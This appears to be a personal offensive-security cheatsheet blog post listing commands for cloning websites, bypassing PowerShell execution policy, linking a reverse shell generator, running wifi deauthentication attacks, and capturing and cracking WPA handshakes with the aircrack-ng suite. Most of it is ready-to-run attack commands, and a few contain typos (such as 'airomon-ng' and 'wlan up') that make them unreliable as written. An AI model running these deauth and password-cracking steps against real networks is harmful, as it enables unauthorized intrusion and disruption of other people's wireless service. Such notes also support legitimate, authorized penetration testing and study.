---
author: clausmalver
title: Offensive Security Cheatsheet
description: A note for quick glances anything related for offensive security.
date: 2024-09-22
categories: [Notes, Hacking]
tags: [linux, powershell, hacking, offensive]
---
## Clone a website

Clone a website including images, css, etc.
`wget -mk -nH [URL]`

## Bypass Powershell Execution Policy
`Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted`

## Reverse shells
[Reverse Shell Generator](https://www.revshells.com/)

## Wireless

Collection of notes regarding wireless attack or similar.

### Alfa Networks

Get USB wifi adapter into monitor mode

```
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan up
```
Check if adapter is in monitor mode

`iwconfig wlan0`

### Wifi monitor using Kismet

`kismet -c wlan0 -p ~/log_directory -t output_file`

### Wifi monitor using airodump

`sudo airodump-ng wlan0`

### Deauth attacks

[wifi-deauth](https://github.com/flashnuke/wifi-deauth) - Python script for deauthing attacks

Install and run on system
```
git clone https://github.com/flashnuke/wifi-deauth.git
sudo pip3 install .
sudo wifi-deauth -i <wireless interface>
```

Remember to let it run for a bit so the app can collect clients it can deauth

### Stop interfering processes using airmon-ng

List possible interfering procceses
`sudo airmon-ng check`

Kill them
`sudo airmon-ng check kill`

### Crack WPA wifi

Set interface to monitor

```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

Kill all processes that uses the interface
`sudo airmon-ng check kill`

Note: `systemctl start NetworkManager` to start the Network services again

Start monitoring on the interface
`sudo airomon-ng [INTERFACE]`

Start capture on all channels
`airodump-ng [INTERFACE]`

Specify the BSSID and Channel, and start capture the handshake
`airodump-ng -c [CHANNEL] --bssid [MAC ADRESS] -w [OUTPUTFILE] wlan0`

Crack the WPA password
`aircrack-ng -w [WORDLIST] -b [BBSID] [PCAP FILE]`
